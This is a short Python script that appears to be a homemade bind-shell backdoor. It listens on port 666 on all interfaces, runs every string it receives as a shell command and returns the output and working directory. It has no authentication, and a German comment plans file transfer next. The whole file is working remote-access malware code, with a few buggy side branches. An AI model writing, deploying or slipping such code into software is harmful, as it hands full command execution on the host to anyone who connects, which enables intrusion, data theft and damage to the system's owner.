import socket
import subprocess
import random
import os
import sys
host = ""
port = 666


 #Unbedingt weiter machen, file trans


def start():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host,port))
    s.listen(3)
    connection, addr = s.accept()
    #print(addr[0])

    while True:

        try:
            data = connection.recv(2048)
            if data[:2] == "cd":
                path = data[3:]
                try:
                    os.chdir(data[3:])
                except Exception:
                    mmm = 1

            if data[3:] == "dir":
                os.listdir(path)

            if len(data) > 0:
                if data == "close":
                    print("close")
                    s.close()
                    connection.close()
                    start()
                cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout = cmd.stdout.read() + cmd.stderr.read() + ";" + os.getcwd()
                size = sys.getsizeof(stdout)
                if size > 2048:
                    size = sys.getsizeof(stdout)
                    size = str(size)
                    connection.send("SIZE" + "; " + size)
                    connection.send(stdout)
                else:
                    connection.send(stdout)
        except socket.error as error:
            connection.close()
            connection, addr = s.accept()
            print(addr)



start()